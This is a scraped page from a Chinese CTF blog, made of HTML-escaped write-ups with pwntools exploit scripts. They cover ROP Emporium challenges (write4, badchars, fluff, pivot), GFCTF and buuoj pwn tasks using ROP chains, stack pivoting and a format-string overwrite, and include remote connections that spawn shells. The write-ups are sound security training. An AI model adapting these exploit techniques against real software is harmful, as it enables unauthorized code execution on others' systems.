elf=ELF(&amp;quot;./callme&amp;quot;)
io=process(&amp;quot;./callme&amp;quot;)
rdi_ret_addr=0x4009a3
rsi_rdx_ret_addr=0x40093d
call1_addr=elf.symbols[&amp;quot;callme_one&amp;quot;]
call2_addr=elf.symbols[&amp;quot;callme_two&amp;quot;]
call3_addr=elf.symbols[&amp;quot;callme_three&amp;quot;]
#1
payload=cyclic(0x28)+flat(rdi_ret_addr,0xdeadbeefdeadbeef,rsi_rdx_ret_addr,0xcafebabecafebabe,0xd00df00dd00df00d,call1_addr)
#2
payload += flat(rdi_ret_addr,0xdeadbeefdeadbeef,rsi_rdx_ret_addr,0xcafebabecafebabe,0xd00df00dd00df00d,call2_addr)
#3
payload += flat(rdi_ret_addr,0xdeadbeefdeadbeef,rsi_rdx_ret_addr,0xcafebabecafebabe,0xd00df00dd00df00d,call3_addr)
#本地环境问题需加上ret_addr
# ret_addr=0x4006be
# payload += p64(ret_addr) //更换环境后不需要加上ret_addr了
io.recvuntil(b&#39;&amp;gt;&#39;)
io.sendline(payload)
# gdb.attach(io)
# pause()
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;write4&lt;/strong&gt;&lt;br&gt;
此题保护措施同上，在ida里面发现没有常见的&lt;code&gt;system()&lt;/code&gt;和&lt;code&gt;/bin/sh&lt;/code&gt;，但是却有一个&lt;code&gt;printf_file&lt;/code&gt;函数，本题提供的libc.so文件中含有system函数，但需要自行构建参数，vmmap查看可写段&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673291428782.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
在ida中也可以找到.bss段，对应vmmap中地址可知此处可写&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673291508659.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
那么向该段写入需要gadgets,ROPgadget找一下&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;# Gadgets information
# ============================================================
# 0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
# 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
# 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
# 0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400690 : pop r14 ; pop r15 ; ret
# 0x0000000000400692 : pop r15 ; ret
# 0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400588 : pop rbp ; ret
# 0x0000000000400693 : pop rdi ; ret
# 0x0000000000400691 : pop rsi ; pop r15 ; ret
# 0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004e6 : ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现可用的，r14存bss段地址，r15存&amp;quot;flag.txt&amp;quot;字符串，接着将r15内容写入r14指向的地址&lt;br&gt;
&lt;code&gt;pop r14 ; pop r15 ; ret&lt;/code&gt;&lt;br&gt;
&lt;code&gt;mov qword ptr [r14], r15 ; ret&lt;/code&gt;&lt;br&gt;
接着按&lt;strong&gt;顺序&lt;/strong&gt;组装gadgets&lt;br&gt;
其中详细调用如图&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673347270739.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
第一个ret将pop_r14_r15，此时栈顶更新位bss段地址&lt;br&gt;
则编写exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context.log_level=&#39;debug&#39;
context.os=&#39;linux&#39;
context.arch=&#39;amd64&#39;
context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

elf=ELF(&amp;quot;./write4&amp;quot;)
io=process(&amp;quot;./write4&amp;quot;)

func_addr=elf.symbols[b&amp;quot;print_file&amp;quot;]
bss_addr=0x601038
ret_addr=0x4004e6
pop_rdi_addr=0x400693
mov_r14_r15_addr=0x400628
pop_r14_r15_addr=0x400690
payload=cyclic(0x28)+p64(pop_r14_r15_addr)+p64(bss_addr)+b&amp;quot;flag.txt&amp;quot;+p64(mov_r14_r15_addr)

payload+=p64(pop_rdi_addr)+p64(bss_addr)+p64(func_addr)
io.recv()
gdb.attach(io)
pause()
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;badchars&lt;/strong&gt;&lt;br&gt;
此题给出print_file函数可以打印出文件内容，则只需传入flag.txt即可，而我们则需要像上一题一样将flag.txt写入bss段&lt;br&gt;
此题给出libc.so，其中包含的pwnme函数中存在函数能替换字符&lt;code&gt;&#39;x&#39;,&#39;g&#39;,&#39;a&#39;,&#39;.&#39;&lt;/code&gt;,&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675184254951.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
为了绕过badchars，我们考虑使用异或后不含关键字的字符串输入，当作参数先写入bss段，再异或一遍得到原字符串&lt;br&gt;
可以写个小脚本判断&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
char a[100];
int lg;
signed main()
{
    gets(a);
    lg=strlen(a);
    for(int j=1;j&amp;lt;=9;j++)
    {
        for(int i=0;i&amp;lt;lg;i++)
        {
            cout&amp;lt;&amp;lt;char(int(a[i])^j);
        }
        cout&amp;lt;&amp;lt;endl;
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得出可用字符串&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675184590104.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
我们选择异或9之后的字符串&lt;code&gt;&#39;oehn&#39;}q}&#39;&lt;/code&gt;&lt;br&gt;
故exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./badchars&amp;quot;)
st=b&amp;quot;oehn&#39;}q}&amp;quot; #flag.txt ^9
bss_addr=0x601038
mov_r13_r12=0x400634
pop_r12_r13_jk_jk=0x40069c
pop_r14_r15=0x4006a0
xor_r15_r14=0x400628
pop_rdi=0x4006a3
func_addr=0x400510
#edit
gdb.attach(io)
pause()
payload=cyclic(0x28)+p64(pop_r12_r13_jk_jk)+st+p64(bss_addr)+p64(0)+p64(0)+p64(mov_r13_r12) #jk junk
#decode
for i in range(0,len(st)):
    payload+=p64(pop_r14_r15)
    payload+=p64(9)
    payload+=p64(bss_addr+i)
    payload+=p64(xor_r15_r14)
payload+=p64(pop_rdi)+p64(bss_addr)+p64(func_addr)
io.recvuntil(b&amp;quot;&amp;gt;&amp;quot;)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
# 0x0000000000400635 : mov dword ptr [rbp], esp ; ret
# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006a0 : pop r14 ; pop r15 ; ret
# 0x00000000004006a2 : pop r15 ; ret
# 0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400588 : pop rbp ; ret
# 0x00000000004006a3 : pop rdi ; ret
# 0x00000000004006a1 : pop rsi ; pop r15 ; ret
# 0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004ee : ret
# 0x0000000000400293 : ret 0xb2ec
# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
# 0x0000000000400629 : xor byte ptr [rdi], dh ; ret

# Unique gadgets found: 18
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以打通&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;fluff&lt;/strong&gt;&lt;br&gt;
此题64位，与此前题类似，不过此题gadgets凑不出任意地址写&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675354574785.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
于是看本题提示&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675354609219.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
找到对应三个没有见过的汇编指令，经查询可以理解如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;xlat	mov al,[al+bx]  #al rax低8位
bextr rbx,rcx,rdx 	如下：
bextr output, 0xd23aacda, 0x59
Input : 11010010001110101010110011011010 = 0xd23aacda
                          |-------|
                              \
                               \
                                \
                                 v
                               |-------|
Output: 00000000000000000000000101100110 = 0x00000166


所需的位块进入输出的最低有效位，输出的其余位变为 0。
stosb	  mov [rdi],al
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;于是我们可以考虑控制rbx，将rbx+al地址所指的值，即&lt;code&gt;[bx+al]&lt;/code&gt;变为我们所需的flag.txt字符串,赋值给rax之后，再通过stosb将rax低8位al写入地址rdi中，即可写的bss段，最后传参即可&lt;br&gt;
不过此题需注意溢出ret后rax值为0xb，需减去，此后除最后一次的每一次都需将前一次rax的值减去，以确保rax能够被正确赋值，另外注意rcx每次有加上0x3ef2,需减去此值&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675355316129.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
寻找所需字符我们可以前往IDA View-A中将数据转换为data寻找(按d键转换，如：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675355527454.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
故编写exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from string import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./fluff&amp;quot;)

flag_addr=[0x4003C4,0x4003C5,0x4003D6,0X4003CF,0x4003FD,0x4003D8,0x400246,0x4003D8] #flag.txt
flag=b&amp;quot;flag.txt&amp;quot;
pop_rdi_ret=0x4006a3
xlat_addr=0x400628  #mov al,[al+rbx]   al rax低8位
pop_rdx_pop_rcx_add_rcx_bextr_addr=0x40062A  #mov rbx,rcx,rdx
stosb_addr=0x400639  #mov [rdi],al
func_addr=0x400510
bss_addr=0x601038
payload=cyclic(0x28)
for i in range(0,8):
    payload+=p64(pop_rdx_pop_rcx_add_rcx_bextr_addr)
    payload+=p64(0x2000)  #0x20 8位16进制数占4字节，4bytes=32bits
    if i==0:
        payload+=p64(flag_addr[i]-0x3EF2-0xb)
    else:
        payload+=p64(flag_addr[i]-0x3EF2-int(flag[i-1]))
    payload+=p64(xlat_addr)
    payload+=p64(pop_rdi_ret)
    payload+=p64(bss_addr+i)
    payload+=p64(stosb_addr)

payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(func_addr)

gdb.attach(io)
pause()

io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;pivot&lt;/strong&gt;&lt;br&gt;
此题64位开启nx保护&lt;br&gt;
ida反编译过后发现发生溢出的为第二次输入，但是溢出后可用长度仅为0x18（0x40-0x28&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675539374390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
根据本题提示需要进行栈迁移&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675540644083.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
而一开始程序就输出了迁移的地址&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675539582981.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
而usefulgadgets里面提供的xhcg指令&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675539618638.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
该指令可以交换寄存器的值，于是我们可以先将提示要迁移的地址写入rax，然后再交换rax和rsp的值，之后ret时相当于pop rip，根据题目猜测此时进行栈迁移&lt;br&gt;
栈迁移后有如此长度我们便可以不受长度限制地编写payload了&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675540154636.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
此题给出libpivot.so文件，并且主程序中反编译没有ret2win函数，要先从程序中调用&lt;code&gt;foothold_function&lt;/code&gt;之后，泄露函数在内存中真实地址，然后再通过&lt;code&gt;.so文件&lt;/code&gt;中两函数之间的偏移量计算，进而调用&lt;code&gt;ret2win&lt;/code&gt;函数，剩下的gadgets组装就是典型的ret2libc类型，不过提供的gadgets让payload简化了许多&lt;br&gt;
exp如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

io=process(&amp;quot;./pivot&amp;quot;)
elf=ELF(&amp;quot;./pivot&amp;quot;)

func_plt=elf.plt[b&amp;quot;foothold_function&amp;quot;]
func_got=elf.got[b&amp;quot;foothold_function&amp;quot;]
mov_rax_prax=0x4009c0
pop_rax_ret=0x4009bb
pop_rbp_ret=0x4007c8
add_rax_rbp=0x4009C4
xhcg_rax_rsp=0x4009BD
call_rax=0x4006b0
offset=0x117  #offset

io.recvuntil(b&amp;quot;pivot: &amp;quot;)
heap_addr=int(io.recv(14),16) 

print(&amp;quot;addr &amp;quot;+hex(heap_addr))

payload2=cyclic(0x28)+p64(pop_rax_ret)+p64(heap_addr)+p64(xhcg_rax_rsp)


payload1=p64(func_plt)+p64(pop_rax_ret)+p64(func_got)+p64(mov_rax_prax)+p64(pop_rbp_ret)+p64(offset)+p64(add_rax_rbp)+p64(call_rax)

io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(payload1)

io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(payload2)

io.interactive()




# 0x00000000004009BB 58                            pop     rax
# 0x00000000004009BC C3                            retn
# 0x00000000004009BC
# 0x00000000004009BD 48 94                         xchg    rax, rsp
# 0x00000000004009BF C3                            retn
# 0x00000000004009BF
# 0x00000000004009C0 48 8B 00                      mov     rax, [rax]
# 0x00000000004009C3 C3                            retn
# 0x00000000004009C3
# 0x00000000004009C4 48 01 E8                      add     rax, rbp
# 0x00000000004009C7 C3                            retn
# 0x00000000004006b0 : call rax
# 0x0000000000400822 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
# 0x00000000004009c1 : mov eax, dword ptr [rax] ; ret
# 0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
# 0x0000000000400a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a2e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a30 : pop r14 ; pop r15 ; ret
# 0x0000000000400a32 : pop r15 ; ret
# 0x00000000004009bb : pop rax ; ret
# 0x0000000000400a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a2f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004007c8 : pop rbp ; ret
# 0x0000000000400a33 : pop rdi ; ret
# 0x0000000000400a31 : pop rsi ; pop r15 ; ret
# 0x0000000000400a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006b6 : ret
&lt;/code&gt;&lt;/pre&gt;
">ROP Emporium writeup</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/aRuqWGDeR/"" data-c="
          &lt;p&gt;此题为64位ret2text题目&lt;br&gt;
先查看一下保护&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674547561780.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
提供system函数，但是string里面没有提供/bin/sh&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674547623074.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
tips提醒，此题考虑传入&lt;code&gt;$0&lt;/code&gt;从而构建&lt;code&gt;system($0)&lt;/code&gt;&lt;br&gt;
故exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io=process(&amp;quot;./shell&amp;quot;)
io=remote(&amp;quot;1.14.71.254&amp;quot;,28279)
elf=ELF(&amp;quot;./shell&amp;quot;)

ret_addr=0x400416
sys_addr=elf.sym[b&amp;quot;system&amp;quot;]
pop_rdi_addr=0x4005e3
str_0_addr=0x400541
payload=cyclic(0x18)+p64(ret_addr)+p64(pop_rdi_addr)+p64(str_0_addr)+p64(sys_addr)
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[GFCTF 2021]where_is_shell wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/T0lmUGTzu/"" data-c="
          &lt;p&gt;此题32位格式化字符串&lt;br&gt;
ida可以看出限制输入长度，没法正常溢出&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674214573867.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
由伪代码可知判断第二次输入和0x804C044处值相等即可输出flag.txt，但此处值为随机&lt;br&gt;
但是存在&lt;code&gt;printf(buf)&lt;/code&gt;意味着存在格式化字符串漏洞，于是可以修改0x804C044处的值来达到目的&lt;br&gt;
32位存放参数在栈中，我们可以在第一次输入时计算出printf的offset&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674214980741.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
由图可知offset为10，A的ASCII为41，41414141出现在第十个%x处&lt;br&gt;
根据覆盖内存地址格式&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674215087906.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以编写exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
# io=process(&amp;quot;./[第五空间2019 决赛]PWN5&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26596)
bc_addr=0x804C044 #覆写地址
payload=p32(bc_addr)+b&amp;quot;%10$n&amp;quot; #offset测算为10
io.sendline(payload)
io.sendline(b&amp;quot;4&amp;quot;) #0x804C044 8位16进制数占用4bytes
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[第五空间2019 决赛]PWN5 1 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/p8Ia9mzuv/"" data-c="
          &lt;ul&gt;
&lt;li&gt;汇编&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;func_1:
    mov ax, CCCC
    mov cx, 128
MyLoop: 
    mov [bx], ax
    add bx, 2
    loop MyLoop
    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;func_1的作用是&lt;br&gt;
将CCCC送进ax寄存器，将128送进cx寄存器&lt;/p&gt;
&lt;p&gt;MyLoop的作用是&lt;br&gt;
将ax寄存器的值&lt;code&gt;CCCC&lt;/code&gt;送进偏移地址为bx中的值的内存单元&lt;br&gt;
然后将bx的值加2（结果可能是进入下一个内存单元的地址,也就是下一个元素地址&lt;br&gt;
然后在回到MyLoop将cx减一，如果cx不为0则继续重复执行以上操作&lt;br&gt;
改写：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;func_1:
    mov ax, CCCC
    mov cx, 128
MyLoop:
    mov [bx], ax
    add bx, 2
    sub cx，1
    cmp cx，0
    jnz MyLoop
    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;根据&lt;code&gt;xor     eax, 33h&lt;/code&gt;猜测加密方式为异或&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
a=[0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]
for i in range(len(a)):
    print(chr(a[i]^0x33),end=&#39;&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1673969471280.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
def calc(num):
    if num&amp;lt;1:
        return 1
    else:
        return num*calc(num-1)
tp=int(input())
print(calc(tp))
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

def pd(a):
    for i in range(len(a)):
        if int(a[i],2)%5==0:
            print(a[i]+&amp;quot; &amp;quot;,end=&#39;&#39;)
        else:
            continue

a=input().split(&amp;quot;,&amp;quot;)
pd(a)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ELF解析器：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;elf.h&amp;gt;
using namespace std;
int scnum,sy;
signed main()
{
    printf(&amp;quot;header:\n&amp;quot;);
    Elf64_Ehdr e64_hd;//参见elf.h定义
    FILE *pt;//定义FILE类型的指针
    pt=freopen(&amp;quot;babyof&amp;quot;,&amp;quot;r&amp;quot;,stdin);//需要判断的文件
    fread(&amp;amp;e64_hd,sizeof(Elf64_Ehdr),1,pt);//从文件流读取数据到e64_hd中
    printf(&amp;quot;Magic number and other info: &amp;quot;);
    for(int i=0;i&amp;lt;16;i++)
    {
        printf(&amp;quot;%02x &amp;quot;,e64_hd.e_ident[i]);
        // cout&amp;lt;&amp;lt;e64_hd.e_ident[i];
    }
    printf(&amp;quot;\n&amp;quot;);
    printf(&amp;quot;Object file type: %x\n&amp;quot;,e64_hd.e_type);
    // cout&amp;lt;&amp;lt;&amp;quot;Object file type: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_type&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Architecture: %lu\n&amp;quot;,e64_hd.e_machine);
    // cout&amp;lt;&amp;lt;&amp;quot;Architecture: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_machine&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Entry point virtual address: 0x%x\n&amp;quot;,e64_hd.e_entry);
    printf(&amp;quot;Program header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_phoff);
    printf(&amp;quot;Section header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_shoff);
    printf(&amp;quot;Processor-specific flags: 0x%x\n&amp;quot;,e64_hd.e_flags);
    printf(&amp;quot;ELF header size in bytes: %d(bytes)\n&amp;quot;,e64_hd.e_ehsize);
    printf(&amp;quot;Program header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_phentsize);
    printf(&amp;quot;Program header table entry count: %d\n&amp;quot;,e64_hd.e_phnum);
    printf(&amp;quot;Section header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_shentsize);
    printf(&amp;quot;Section header table entry count: %d\n&amp;quot;,e64_hd.e_shnum);
    printf(&amp;quot;Section header string table index: %d\n\n&amp;quot;,e64_hd.e_shstrndx);
    scnum=e64_hd.e_shnum;
    sy=e64_hd.e_shstrndx;
    // section start
    printf(&amp;quot;section:\n&amp;quot;);
    // Elf64_Shdr *sc;//参见elf.h定义
    Elf64_Shdr sc[scnum];
    fseek(pt, e64_hd.e_shoff, SEEK_SET);//从文件开头开始偏移e64_hd.e_shoff
    fread(sc,sizeof(Elf64_Shdr)*scnum,1,pt);//从文件流读取数据到sc中
    printf(&amp;quot;  \ttype      addr      offset    size\n&amp;quot;);
    for(int i=0;i&amp;lt;scnum;i++)
    {
        printf(&amp;quot;num:%d\t%-10x%-10x%-10x%-10d\n&amp;quot;,i+1,sc[i].sh_type,sc[i].sh_addr,sc[i].sh_offset,sc[i].sh_size);
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;warmup_csaw_2016_1:&lt;br&gt;
此题64位保护全关，f12发现有&lt;code&gt;system和cat flag.txt&lt;/code&gt;可以根据提示直接溢出到后门地址，也可以传参作答&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673972525899.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28711)
elf=ELF(&amp;quot;./222&amp;quot;)
sys_addr=elf.sym[b&amp;quot;system&amp;quot;]
# sys_addr=0x400378
# ret_addr=0x4004a1
str_flag_addr=next(elf.search(b&amp;quot;cat flag.txt&amp;quot;))
# str_flag_addr=0x400734
pop_rdi_addr=0x400713
payload=cyclic(0x48)+p64(pop_rdi_addr)+p64(str_flag_addr)+p64(sys_addr)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040070c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040070e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400710 : pop r14 ; pop r15 ; ret
# 0x0000000000400712 : pop r15 ; ret
# 0x000000000040070b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040070f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400565 : pop rbp ; ret
# 0x0000000000400713 : pop rdi ; ret
# 0x0000000000400711 : pop rsi ; pop r15 ; ret
# 0x000000000040070d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004a1 : ret
# 0x0000000000400595 : ret 0xc148

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">week3作业</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/4zZZpFGKf/"" data-c="
          &lt;ul&gt;
&lt;li&gt;一开始的context模板如下&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
context.log_level = &#39;debug&#39;
context.arch=&#39;amd64&#39;
context.os=&#39;linux&#39; #前三项可根据实际情况更改
context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;] #需要配合tmux使用，开启gdb调试前需打开tmux

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;使用tmux快捷键唤起方式为 &lt;code&gt;ctrl+b&lt;/code&gt; ，后接其它键，如&lt;code&gt;ctrl+b o&lt;/code&gt; 可以切换分屏的&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673200645360.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
">pwndbg调试注意事项</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/diY6jAN2C/"" data-c="
          &lt;ul&gt;
&lt;li&gt;ELF文件相关&lt;a href=&#34;https://oraclepi.tech/k_3A9NnKQ&#34;&gt;PWN篇-二进制文件&lt;/a&gt;&lt;br&gt;
